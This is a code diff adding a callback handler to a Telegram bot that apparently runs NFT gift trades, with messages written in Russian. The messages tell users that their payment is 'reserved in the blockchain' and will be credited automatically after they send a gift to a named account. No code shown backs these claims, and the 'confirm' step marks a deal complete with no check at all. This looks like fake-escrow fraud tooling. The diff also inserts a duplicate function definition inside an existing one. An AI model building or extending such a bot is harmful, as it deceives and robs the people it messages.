@@ -765,6 +765,131 @@ def process_cb(cb):
 
             if not deal or deal["st"] != "pending":
                 ac(cbid)
+# --- CALLBACK HANDLER ---
+
+def process_cb(cb):
+    try:
+        cbid = cb["id"]
+        uid = cb["from"]["id"]
+        msg = cb.get("message") or {}
+        cid = msg.get("chat", {}).get("id", uid)
+        mid = msg.get("message_id", 0)
+        data = cb.get("data", "")
+        ci = msg.get("business_connection_id")
+
+        if data.startswith("check:"):
+            did = data.split(":", 1)[1]
+            deal = get_deal(did)
+
+            if not deal:
+                ac(cbid, txt="❌ Оффер не найден", sa=True)
+                return
+
+            if deal["st"] not in ("accepted", "checking"):
+                ac(cbid, txt="❌ Оффер не активен", sa=True)
+                return
+
+            if deal["st"] == "checking":
+                ac(cbid, txt="⏳ Уже проверяется", sa=True)
+                return
+
+            set_deal_status(did, "checking")
+            ac(cbid)
+
+            nf = fmt(deal["num"])
+            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
+            h = deal["hold"]
+            nl = f"https://t.me/nft/{deal['slug']}"
+            bci = deal.get("bci") or ci
+
+            hidden = f'<a href="{nl}">\u200b</a>'
+
+            txt = hidden + f"🔄 <b>Статус: Проверяется передача</b>\n\n"
+            txt += f"Ожидается NFT <b>{deal['name']} #{nf}</b> от @{h}.\n"
+            txt += f"После получения NFT, {deal['price']} {cs} будут разморожены."
+
+            em(cid, mid, txt, kb=confirm_kb(did), bci=bci)
+            return
+
+        if data.startswith("confirm:"):
+            did = data.split(":", 1)[1]
+            deal = get_deal(did)
+
+            if not deal or deal["st"] != "checking":
+                ac(cbid, txt="❌ Сделка не активна", sa=True)
+                return
+
+            set_deal_status(did, "completed")
+            ac(cbid)
+
+            nf = fmt(deal["num"])
+            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
+            h = deal["hold"]
+            nl = f"https://t.me/nft/{deal['slug']}"
+            bci = deal.get("bci") or ci
+
+            hidden = f'<a href="{nl}">\u200b</a>'
+
+            txt = hidden + f"✅ <b>Сделка успешно завершена!</b>\n\n"
+            txt += f"NFT <b>{deal['name']} #{nf}</b> получен.\n"
+            txt += f"{deal['price']} {cs} отправлены продавцу."
+
+            em(cid, mid, txt, kb={"inline_keyboard": []}, bci=bci)
+            return
+
+        if data.startswith("accept:"):
+            did = data.split(":", 1)[1]
+            deal = get_deal(did)
+
+            if not deal or deal["st"] != "pending":
+                ac(cbid)
+                return
+
+            set_deal_status(did, "accepted")
+            ac(cbid)
+
+            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
+            nf = fmt(deal["num"])
+            h = deal["hold"]
+            nl = f"https://t.me/nft/{deal['slug']}"
+            bci = deal.get("bci") or ci
+
+            hidden = f'<a href="{nl}">\u200b</a>'
+
+            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
+            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
+            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
+
+            d = {
+                "chat_id": cid,
+                "message_id": mid,
+                "text": txt,
+                "parse_mode": "HTML",
+                "link_preview_options": {
+                    "is_disabled": False,
+                    "show_above_text": True,
+                    "url": nl
+                },
+                "reply_markup": aakb(did, h)
+            }
+
+            if bci:
+                d["business_connection_id"] = bci
+
+            res = api("editMessageText", **d)
+
+            if not res.get("ok"):
+                dm(cid, mid, bci=bci)
+                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
+
+            return
+
+        if data.startswith("decline:"):
+            did = data.split(":", 1)[1]
+            deal = get_deal(did)
+
+            if not deal or deal["st"] != "pending":
+                ac(cbid)
                 return
 
             set_deal_status(did, "declined")
